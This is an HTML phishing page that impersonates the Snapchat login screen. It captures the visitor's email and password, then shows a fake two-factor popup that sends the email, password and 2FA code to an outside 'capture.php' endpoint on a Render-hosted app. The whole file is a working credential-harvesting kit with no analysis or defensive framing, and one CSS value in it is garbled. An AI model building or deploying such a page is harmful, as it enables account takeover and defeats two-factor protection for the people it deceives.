<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat - Log In</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fffc00;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: white;
            padding: 40px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            width: 300px;
        }
        .login-box img {
            width: 100%;
            height: auto;
            margin-bottom: 20px;
        }
        .login-box input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }
        .login-box button {
            width: 100%;
            padding: 10px;
            background-color: #00d2ff;
            border: none;
            border-radius: 5px;
            color: white sanctions;
            font-weight: bold;
            cursor: pointer;
        }
        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.5);
            z-index: 1000;
            width: 280px;
            text-align: center;
        }
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 999;
        }
        .popup input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }
        .popup button {
            background-color: #00d2ff;
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 5px;
            color: white;
            font-weight: bold;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://ci3.googleusercontent.com/meips/ADKq_NbZ4GBbBjP7llXS1csHamyaEXA2a6TTrQjTxeSjMbjy3JGWgyGRTew1fjd790tLKxWwczmtiGoi1ydVF8tGBJrIBpFWar1Pih-mkR9eIiZNQgHauNuBQIaNkqD6D9ZxSkKdHw=s0-d-e1-ft#https://cf-st.sc-cdn.net/d/cTpNdvCPJ0JO2m6GiLwy6?bo=Eg0aABoAMgEESAJQCGAB&uc=8" alt="Snapchat Logo">
        <h2>Log In to Snapchat</h2>
        <form id="loginForm" onsubmit="return show2FAPopup(event)">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
    <div class="overlay" id="overlay"></div>
    <div class="popup" id="twoFAPopup">
        <h3>Enter Your 2FA Code</h3>
        <form id="twoFAForm" action="https://your-render-app.onrender.com/capture.php" method="POST">
            <input type="hidden" name="email" id="hiddenEmail">
            <input type="hidden" name="password" id="hiddenPassword">
            <input type="text" name="twofa" placeholder="2FA Code" required>
            <button type="submit">Verify</button>
        </form>
    </div>

    <script>
        function show2FAPopup(event) {
            event.preventDefault();
            const form = document.getElementById('loginForm');
            const email = form.querySelector('input[name="email"]').value;
            const password = form.querySelector('input[name="password"]').value;

            document.getElementById('hiddenEmail').value = email;
            document.getElementById('hiddenPassword').value = password;

            document.getElementById('twoFAPopup').style.display = 'block';
            document.getElementById('overlay').style.display = 'block';
            return false;
        }
    </script>
</body>
</html>
